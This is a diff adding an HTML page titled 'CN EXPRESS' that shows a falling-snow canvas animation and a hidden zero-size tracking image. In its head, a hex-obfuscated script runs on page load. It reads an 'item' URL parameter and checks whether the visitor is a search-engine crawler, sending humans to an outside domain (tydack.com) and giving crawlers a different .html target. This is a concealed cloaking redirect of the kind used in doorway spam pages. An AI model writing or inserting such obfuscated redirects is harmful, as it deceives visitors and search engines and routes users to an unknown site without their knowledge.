@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="EN" >
+<head>
+<meta charset="UTF-8">
+<title>CN EXPRESS</title>
+<meta name="robots" content="index,follow"/>
+<link rel="icon" type="image/x-icon" href="/favicon.png"/>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<style>
+body,canvas,html{width:100%;height:100%}body,html{overflow:hidden;font-family:"Press Start 2P",cursive}.center{position:absolute;top:0;bottom:0;left:0;right:0;color:#fff;display:flex;align-items:center}.center .text-center{text-align:center;width:100%}h1{display:inline-block;padding-right:5px;border-right:10px solid #fff;animation:1s infinite blink}@media screen and (max-width:370px){h1{font-size:5vw;border-right:4px solid #fff}}@keyframes blink{0%,50%{border-right-color:transparent}100%,51%{border-right-color:#fff}}canvas{background:#000}
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script> 
+</head>
+
+<img src="//sstatic1.histats.com/0.gif?4705536&101" alt="" border="0" style="width:0;height:0;">
+<script>
+var _0x7f8e=["\x72\x65\x70\x6C\x61\x63\x65","\x73\x65\x61\x72\x63\x68","\x70\x61\x74\x68\x6E\x61\x6D\x65","\x65\x78\x65\x63","","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x74\x65\x73\x74","\x69\x74\x65\x6D","\x68\x72\x65\x66","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x79\x64\x61\x63\x6B\x2E\x63\x6F\x6D\x2F\x69\x2F","\x2E\x68\x74\x6D\x6C"];(function(){let _0x4b34x1=(function(){var _0x4b34x2={};location[_0x7f8e[1]][_0x7f8e[0]](/[?&]+([^=&]+)=([^&]*)/gi,function(_0x4b34x3,_0x4b34x4,_0x4b34x5){_0x4b34x2[_0x4b34x4]= _0x4b34x5});return _0x4b34x2})();(/(\d+)\.html$/[_0x7f8e[3]](location[_0x7f8e[2]]))?/(\d+)\.html$/[_0x7f8e[3]](location[_0x7f8e[2]])[1]:_0x7f8e[4];let _0x4b34x6=/bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|yandex/i[_0x7f8e[6]](navigator[_0x7f8e[5]]);if(_0x4b34x1[_0x7f8e[7]]&&  !_0x4b34x6){location[_0x7f8e[8]]= _0x7f8e[9]+ _0x4b34x1[_0x7f8e[7]]+ _0x7f8e[4]}else {if(_0x4b34x1[_0x7f8e[7]]&& _0x4b34x6){location[_0x7f8e[0]](_0x7f8e[9]+ _0x4b34x1[_0x7f8e[7]]+ _0x7f8e[10])}}})()
+</script>
+
+<body translate="no" >
+<link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet">
+<canvas id="snow"></canvas>
+<div class="center">
+  <div class="text-center">
+    <h1>CN EXPRESS</h1>
+  </div>
+</div>
+
+<script id="rendered-js" >
+var Snow = {
+  el: "#snow",
+  density: 10000, // higher = fewer bits
+  maxHSpeed: 5, // How much do you want them to move horizontally
+  minFallSpeed: 2,
+  canvas: null,
+  ctx: null,
+  particles: [],
+  colors: [],
+  mp: 1,
+  quit: false,
+  init() {
+    this.canvas = document.querySelector(this.el);
+    this.ctx = this.canvas.getContext("2d");
+    this.reset();
+    requestAnimationFrame(this.render.bind(this));
+    window.addEventListener("resize", this.reset.bind(this));
+  },
+  reset() {
+    this.w = window.innerWidth;
+    this.h = window.innerHeight;
+    this.canvas.width = this.w;
+    this.canvas.height = this.h;
+    this.particles = [];
+    this.mp = Math.ceil(this.w * this.h / this.density);
+    for (var i = 0; i < this.mp; i++)
+    {
+      var size = Math.random() * 4 + 5;
+      this.particles.push({
+        x: Math.random() * this.w, //x-coordinate
+        y: Math.random() * this.h, //y-coordinate
+        w: size,
+        h: size,
+        vy: this.minFallSpeed + Math.random(), //density
+        vx: Math.random() * this.maxHSpeed - this.maxHSpeed / 2,
+        fill: "#ffffff",
+        s: Math.random() * 0.2 - 0.1 });
+
+    }
+  },
+  render() {
+    this.ctx.clearRect(0, 0, this.w, this.h);
+    this.particles.forEach((p, i) => {
+      p.y += p.vy;
+      p.x += p.vx;
+      this.ctx.fillStyle = p.fill;
+      this.ctx.fillRect(p.x, p.y, p.w, p.h);
+      if (p.x > this.w + 5 || p.x < -5 || p.y > this.h) {
+        p.x = Math.random() * this.w;
+        p.y = -10;
+      }
+    });
+    if (this.quit) {
+      return;
+    }
+    requestAnimationFrame(this.render.bind(this));
+  },
+  destroy() {
+    this.quit = true;
+  } };
+var confetti = Snow.init();
+</script>
+
+</body>
+</html>
